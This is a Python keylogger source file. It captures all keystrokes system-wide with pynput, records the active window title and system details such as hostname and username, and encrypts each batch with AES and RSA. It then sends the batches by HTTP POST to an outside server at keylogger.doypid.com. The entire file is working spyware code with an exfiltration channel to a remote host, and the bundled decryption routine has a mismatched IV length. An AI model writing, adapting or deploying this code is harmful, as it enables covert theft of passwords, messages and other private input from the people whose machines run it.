from pynput import keyboard
from datetime import datetime
import time
import threading
import requests
import uuid
import platform
import os
import base64
import pygetwindow

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# config
COUNTDOWN_DURATION = 10 # relatively arbitrary duration but represents the time before key collection stops for that batch of inputs
# LOG_FILE_PATH = "keylogs.txt" # temp local file
SERVER_BASE_URL = "http://keylogger.doypid.com"
SERVER_URL = f"{SERVER_BASE_URL}/log"
HANDSHAKE_ENDPOINT = f"{SERVER_BASE_URL}/handshake"

# globals
collected_keys = [] # list to store the accumulated key logs
countdown_active = False # flag to indicate if the countdown thread is running
initial_log_time = None # current batch start timestamp
last_keypress_time = None # last input timestamp (initialized to None, will be set on first keypress)
MAX_LOG_CHARACTER_LIMIT = 500 # max characters to log in a single batch
KILL_SWITCH_PHRASE = "keylogger kill"
kill_buffer = [] # buffer to check for the kill switch phrase
MAX_KILL_BUFFER_LEN = len(KILL_SWITCH_PHRASE)
SYMMETRIC_KEY = None
PUBLIC_KEY_PEM = None

def generate_aes_key():
    """Generates a new random AES (symmetric) key."""
    return os.urandom(32)  # 256 bit key

def encrypt_aes_gcm(key, plaintext):
    """Encrypts data using AES-256 in GCM mode."""
    iv = os.urandom(12)  # GCM standard IV size
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()
    tag = encryptor.tag
    return iv + ciphertext + tag # concat iv, ciphertext, and auth tag for transmission

def decrypt_aes_gcm(key, encrypted_data):
    """Decrypts data using AES-256 in GCM mode."""
    iv_len = 16 # AES GCM is 16 bytes
    tag_len = 16 # GCM tag is also 16 bytes

    iv = encrypted_data[:iv_len] # extract the IV
    ciphertext = encrypted_data[iv_len:-tag_len] # extract the ciphertext
    tag = encrypted_data[-tag_len:] # extract the tag

    # create the cipher object and decrypt
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    return plaintext.decode()

def perform_handshake():
    """
    Retrieves the RSA public key from the server and generates a symmetric AES key.
    The AES key is then encrypted with the RSA public key for secure transmission.
    Returns the encrypted AES key.
    """

    global SYMMETRIC_KEY, PUBLIC_KEY_PEM

    print("Performing handshake to retrieve RSA public key and generate AES key...")
    try:
        response = requests.get(HANDSHAKE_ENDPOINT)
        response.raise_for_status()
        public_key_data = response.json()
        PUBLIC_KEY_PEM = public_key_data.get("public_key_pem")

        if not PUBLIC_KEY_PEM:
            raise ValueError("Public key PEM not found in response.")
        
        server_public_key = serialization.load_pem_public_key(
            PUBLIC_KEY_PEM.encode('utf-8'),
            backend=default_backend()
        )
        print("Public key retrieved successfully.")

        SYMMETRIC_KEY = generate_aes_key()
        print("Generated new AES symmetric key.")

        encrypted_symmetric_key = server_public_key.encrypt(
            SYMMETRIC_KEY,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # the encrypted AES key will be sent along with the first encrypted log data
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error: Handshake failed (network error): {e}")
    except ValueError as e:
        print(f"Error: Handshake failed (data error): {e}")
    except Exception as e:
        print(f"Error: An unexpected error occurred during handshake: {e}")

    return False

def get_active_window_title():
    try:
        active_window = pygetwindow.getActiveWindow()
        if active_window:
            return active_window.title
    except pygetwindow.PyGetWindowException:
        # if no active window is found or on some systems
        return "N/A - Window Info Unavailable"
    except Exception as e:
        print(f"Error getting window title: {e}")
        return "N/A - Error"

# record each key press and determine the time
def on_press(key):
    global last_keypress_time, countdown_active, initial_log_time, collected_keys, kill_buffer, SYMMETRIC_KEY, PUBLIC_KEY_PEM

    # Initialize initial_log_time if this is the first key in a new batch
    if initial_log_time is None:
        initial_log_time = datetime.now()

    try:
        char = key.char
        char_to_log = char
        print(char, end='', flush=True) 

    except AttributeError:
        # Handle special keys i.e. Space, Enter, Shift, Ctrl, Alt
        if key == keyboard.Key.space:
            char_to_log = " "
        elif key == keyboard.Key.enter:
            char_to_log = "\n" # Add newline for readability
        elif key == keyboard.Key.tab:
            char_to_log = "\t"
        elif key == keyboard.Key.backspace:
            char_to_log = "[BKSP]"
        elif key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            char_to_log = "[C]"
        elif key == keyboard.Key.alt or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            char_to_log = "[A]"
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            char_to_log = "[S]"
        elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
            char_to_log = "[CMD]"
        elif key == keyboard.Key.esc:
            char_to_log = "[E]"
        elif key == keyboard.Key.caps_lock:
            char_to_log = "[CPS]"
        elif key == keyboard.Key.delete:
            char_to_log = "[DEL]"
        else:
            # For other misc special keys (e.g., Key.shift, Key.ctrl_l, Key.alt_gr)
            char_to_log = f"[{str(key).replace('Key.', '').upper()}]"
        
        print(char_to_log, end='', flush=True)
    
    # limit the number of characters logged in a single batch
    if len(collected_keys) >= MAX_LOG_CHARACTER_LIMIT:
        print("\nMax log character limit reached. Removing oldest keys to make space.")
        collected_keys = collected_keys[-(MAX_LOG_CHARACTER_LIMIT // 2):]
    
    # Add keypress and window title info to collected_keys
    collected_keys.append(char_to_log)
    
    # update the time of the last key press
    last_keypress_time = time.time()

    # kill switch logic, failsafe deactivation method to simplify usage and ensure it can be triggered by the user
    kill_buffer.append(char_to_log.lower()) # case insenitively document the collection of pressed keys
    if len(kill_buffer) > MAX_KILL_BUFFER_LEN:
        kill_buffer.pop(0)

    if "".join(kill_buffer) == KILL_SWITCH_PHRASE:
        print(f"\nKill switch phrase '{KILL_SWITCH_PHRASE}' detected. Shutting down keylogger.")
        return False # stop the listener and exit the program
    
    # start the countdown thread only if it's not already active and after the first keypress has set last_keypress_time.
    if not countdown_active:
        countdown_active = True
        threading.Thread(target=start_countdown, daemon=True).start() # daemon=True allows the thread to exit when the main program exits


# start a countdown thread that will dump the collected keys after a certain period of inactivity
def start_countdown():
    global countdown_active, last_keypress_time # Ensure last_keypress_time is global here

    # loop while countdown is active AND there's still inactivity
    # last_keypress_time will be a float by the time this loop runs due to fix in on_press
    while countdown_active and (time.time() - last_keypress_time) < COUNTDOWN_DURATION:
        time.sleep(1) # Check every second
    
    # if the loop finished because the countdown expired (i.e., no keypress for COUNTDOWN_DURATION)
    if countdown_active: 
        countdown_active = False # reset flag for the next batch
        print(f"\n{COUNTDOWN_DURATION} seconds expired, dumping data...")
        send_data_batch()

def send_data_batch():
    global collected_keys, initial_log_time, SYMMETRIC_KEY, PUBLIC_KEY_PEM

    if not collected_keys:
        print("No data to send in this batch.")
        return

    current_log_time = datetime.now()
    log_duration_seconds = (current_log_time - initial_log_time).total_seconds() if initial_log_time else 0
    log_content = "".join(collected_keys)

    system_info = {
        "system_id": str(uuid.getnode()),
        "hostname": platform.node(),
        "os": platform.system(),
        "os_release": platform.release(),
        "username": os.getlogin(),
        "active_window": get_active_window_title(),
    }

    # Encrypt log content with AES-GCM
    encrypted_log_content = encrypt_aes_gcm(SYMMETRIC_KEY, log_content)
    encrypted_log_content_b64 = base64.b64encode(encrypted_log_content).decode()

    # Encrypt AES key with RSA (already done in handshake, reuse or re-encrypt if needed)
    server_public_key = serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode('utf-8'), backend=default_backend())
    encrypted_aes_key = server_public_key.encrypt(
        SYMMETRIC_KEY,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    encrypted_aes_key_b64 = base64.b64encode(encrypted_aes_key).decode()

    data = {
        "system_info": system_info,
        "log_start_time_utc": initial_log_time.isoformat() + "Z" if initial_log_time else None,
        "log_duration_seconds": log_duration_seconds,
        "encrypted_aes_key": encrypted_aes_key_b64,
        "encrypted_log_content": encrypted_log_content_b64
    }

    try:
        # print("Encryped AES key length (bytes):", len(encrypted_aes_key))
        # print("Encrypted AES key (base64) length:", encrypted_aes_key_b64)
        # print("AES key (hex):", SYMMETRIC_KEY.hex())
        # print("Encrypted log content length (bytes):", len(encrypted_log_content))
        response = requests.post(SERVER_URL, json=data)
        response.raise_for_status()
        print(f"Data sent successfully. Server response: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data: {e}")
    finally:
        collected_keys.clear()
        initial_log_time = None


# main listens for key inputs, records them and dumps them to a file after a certain period of inactivity
if __name__ == "__main__":
    print("--- Keylogger Started ---")
    print(f"Monitoring system-wide key inputs. Data will dump after {COUNTDOWN_DURATION}s of inactivity.")
    print("Press Ctrl+C to stop.")
    print("-------------------------")

    if not perform_handshake():
        print("Handshake failed. Exiting.")
        exit(1)

    listener = keyboard.Listener(on_press=on_press)
    # The countdown thread is now explicitly started inside on_press,
    # so we don't start it here in main.

    listener.start() # Start the pynput listener thread

    try:
        # keep the main tread alive, this will be interrupted by Ctrl+C
        # a simple infinite loop or long sleep works
        while listener.running:
            time.sleep(1) # sleep for 1 second and check listener status again
        
    except KeyboardInterrupt:
        print("\n-------------------------")
        print("Keylogger Stopped by User (Ctrl+C).")
        
        # dump any remaining collected keys before exiting
        # if collected_keys:
        #     print("Dumping final batch of collected keys...")
        #     send_data_batch() # call dump_data_batch for any remaining data
        
        # print("-------------------------")
    finally:
        # ensure the listener thread is stopped when the main thread exits
        listener.stop() 
        listener.join() # wait for the listener thread to finish cleanly
        print("Keylogger process ended.")